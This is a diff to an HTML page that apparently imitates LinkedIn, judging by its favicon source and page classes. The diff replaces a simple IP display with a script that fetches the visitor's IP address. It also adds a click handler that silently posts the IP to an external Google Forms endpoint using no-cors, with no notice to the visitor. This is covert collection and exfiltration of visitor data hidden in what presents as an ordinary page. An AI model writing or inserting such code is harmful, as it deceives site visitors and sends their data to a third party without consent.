@@ -111,10 +111,36 @@
     }
   </script> -->
   <script nonce="1cDKta959kS3xWhxgMjDKw">
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => console.log("Your IP:", data.ip));
-    </script>
+  let userIP = "unknown";
+
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      userIP = data.ip;
+      console.log("User IP:", userIP);
+    });
+
+  function collectUserData() {
+    const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScEyyaORU5CdfsuOn_T9tO2kYDsA_s4Y2K_eU_FZGF4gTTOlg/formResponse";
+
+    const formData = new FormData();
+    formData.append("1234567890", userIP);
+    formData.append("entry.102555232149743304879", userIP);
+    formData.append("entry.1111111111", userIP);
+
+    fetch(formURL, {
+      method: "POST",
+      mode: "no-cors",
+      body: formData
+    }).then(() => {
+      console.log("User data sent.");
+    });
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    document.body.addEventListener('click', collectUserData);
+  });
+</script>
 </body>
 
 <link rel="icon" href="https://raw.githubusercontent.com/NandiniRam32/LinkedIn-Loading/main/LinkedInLogo.png" type="image/png">
@@ -122,7 +148,6 @@
 
     </head><body dir="ltr" class="render-mode-BIGPIPE nav-v2">
 
-        <!-- Add this to your HTML body somewhere -->
 <div id="geo-popup" style="
   position: fixed;
   bottom: 20px;
